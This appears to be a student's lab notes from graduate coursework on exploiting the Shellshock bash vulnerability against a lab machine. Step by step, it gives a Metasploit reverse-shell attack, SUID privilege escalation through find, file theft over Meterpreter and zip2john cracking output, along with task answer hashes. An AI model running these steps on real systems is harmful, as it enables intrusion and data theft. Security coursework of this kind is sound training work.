# Shellshock
Documentation for exploitation of Shellshock bash vulnerability for graduate coursework

## Scanning
nmap scan subnets
nmap 10.0.2.4

## Attack CGI Program
msfconsole
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set rhost 10.0.2.4 
set targeturi /cgi-bin/shellshock.cgi
set payload linux/x86/shell/reverse_tcp
check
exploit

## Privilege Escalation
/bin/bash -i
ls -la (eg: find / -perm -u=s -type f 2>/dev/null)
find /usr/bin/ -name find -exec /bin/bash -ip \;
task4 rheavican3

Here is your task4 hash:
2fba992ab63ad4f5a260220a1ad2e75b81116ab4630700b71380eadc275edc72

## Password cracking
To begin, start a Meterpreter shell (using a meterpreter shell payload) through the Metasploit shellshock module in Task 3

msfconsole
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set rhost 10.0.2.4 
set targeturi /cgi-bin/shellshock.cgi
set payload linux/x86/meterpreter/reverse_tcp 
cd \home\shellshock_server\secret_files\
download task51.zip
download task52.pyc.gpg

/usr/sbin/ as path variable
You should use zip2john and gpg2john

zip2john -c /home/kali/task51.zip                                      
Outputting hashes that are 'checksum ONLY' hashes
ver 2.0 efh 5455 efh 7875 task51.zip/task51.pyc PKZIP Encr: TS_chk, cmplen=456, decmplen=682, crc=5330F289 ts=1D79 cs=1d79 type=8
task51.zip/task51.pyc:$pkzip$1*1*1*0*8*24*1d79*97ec3d5876142dbdcdd3d47ccce26cba43740e80a661efbc5d4b9c734d45cc3b05fc4570*$/pkzip$:task51.pyc:task51.zip::/home/kali/task51.zip

## References
- Metasploit: https://null-byte.wonderhowto.com/how-to/exploit-shellshock-web-server-using-metasploit-0186084/
- Spawn an interactive shell: https://rcenetsec.com/shell-spawning/
- Privilege escalation: https://tbhaxor.com/exploiting-suid-binaries-to-get-root-user-shell/
